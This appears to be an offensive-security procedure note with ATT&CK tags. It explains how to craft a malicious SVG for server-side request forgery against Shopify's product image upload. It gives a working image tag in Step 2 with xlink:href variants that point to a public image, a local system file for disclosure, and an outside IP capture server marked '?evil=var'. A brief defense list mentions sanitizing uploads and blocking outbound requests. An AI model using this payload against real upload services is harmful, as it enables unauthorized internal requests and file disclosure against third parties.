---
id: proc-craft-svg-ssrf
tags:
  - ssrf
  - svg
  - crafting
type: procedure
tools:
  - '[[tools/Inkscape]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T05:32:10.517Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-SVG-with-External-Reference

## Summary

This procedure creates a malicious SVG file using an external graphics editor that embeds references to arbitrary external URLs or local files via the xlink:href attribute, enabling SSRF when uploaded to vulnerable parsers like Shopify's.

## Description

In the context of Shopify's product image upload, the SVG parser fetches resources specified in <image> tags without validation. This procedure details crafting such an SVG to point to public resources (e.g., Google images) for proof-of-concept, private servers for request capture, or local paths for file disclosure. Prerequisites include access to a vector editor and basic XML knowledge; outcomes include a file that triggers unauthorized server requests upon upload.

## Requirements

1. Inkscape or similar SVG editor installed
2. Knowledge of target URLs or local paths to reference
3. File system access to save the SVG

## Defense

Defensive measures and detection strategies:

- Sanitize SVG uploads by stripping or whitelisting xlink:href attributes
- Use network firewalls to block outbound requests from image processors
- Monitor server logs for unexpected fetches to internal or external resources

## Objectives

1. Generate a functional SVG that embeds malicious references
2. Test compatibility with target parsers
3. Enable SSRF exploitation for reconnaissance or disclosure

## Instructions

### Step 1: Open SVG Editor

**Context**: Launch Inkscape to create a new vector file.

No command required; use the GUI to start a blank SVG.

> Expected: New document opens.

### Step 2: Insert Image Tag

**Context**: Add an <image> element with xlink:href to the SVG XML.

Edit the XML source in Inkscape (File > XML Editor) and insert:

```xml
<image x="0" y="0" width="100" height="100" xlink:href="http://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif" />
```

For local: replace with "/lib/plymouth/ubuntu_logo.png". For private: use "http://37.139.18.151:3001/?evil=var".

> Explanation: This tag instructs the parser to fetch and embed the resource. Save as .svg.

### Step 3: Validate SVG

**Context**: Ensure the file is valid and references are intact.

Open the SVG in a browser or Inkscape preview.

> Expected: No rendering errors; references noted but not fetched client-side.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Inkscape]]

## Tags

- ssrf
- svg
